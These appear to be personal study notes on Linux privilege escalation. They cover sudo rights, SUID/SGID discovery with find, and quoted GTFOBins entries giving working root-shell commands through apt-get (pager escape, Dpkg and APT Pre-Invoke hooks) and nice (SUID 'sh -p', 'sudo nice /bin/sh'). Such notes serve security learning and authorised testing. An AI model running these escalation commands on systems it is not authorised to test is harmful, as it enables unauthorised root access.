# Priveledge Escalation

To check a list of all the sudo commands that can be run 

	sudo -l

 To become root

 	sudo -i

# SUDO DEMO

	gtfobins.github.io

***SEARCH COMMANDS AND IT'LL TELL YOU WHAT RUNNING IT WILL DO***

Click on "sudo" button and then scroll down to find command "apt-get"
```
.. / apt-get 
Shell Sudo
Shell
It can be used to break out from restricted environments by spawning an interactive system shell.

This invokes the default pager, which is likely to be less, other functions may apply.

apt-get changelog apt
!/bin/sh
Sudo
If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

This invokes the default pager, which is likely to be less, other functions may apply.

sudo apt-get changelog apt
!/bin/sh
For this to work the target package (e.g., sl) must not be installed.

TF=$(mktemp)
echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' > $TF
sudo apt-get install -c $TF sl
When the shell exits the update command is actually executed.

sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
```

# SUID/SGID

Allow you to execute comands as root even though you are not root 

e.g. change password

## The find command is likely the best tool for finding binaries that are SGID or SUID:
```
find / -type f -perm /4000 -ls 2>/dev/null # Find SUID only files

find / -type f -perm /2000 -ls 2>/dev/null # Find SGID only files

find / -type f -perm /6000 -ls 2>/dev/null # Find SUID and/or SGID files
```

For example, if the /usr/bin/nice executable is suid, it could be used to execute arbitrary commands via:

***ON GTFO BINS***

```
.. / nice 
Shell SUID Sudo
Shell
It can be used to break out from restricted environments by spawning an interactive system shell.

nice /bin/sh
SUID
If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.

This example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.
## SKIP THIS STEP, CMD WILL ALREADY BE ON BOX, DO NOT INSTALL

sudo install -m =xs $(which nice) .

./nice /bin/sh -p

## DO NOT USE "./" BECAUSE GTFO BINS ASSUMES YOU JUST DOWNLOADED TO CWD, JUST RUN COMMAND 

Sudo
If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

sudo nice /bin/sh
```

***USE COMMAND *id* TO SEE PERMISSIONS***


POSTULATE










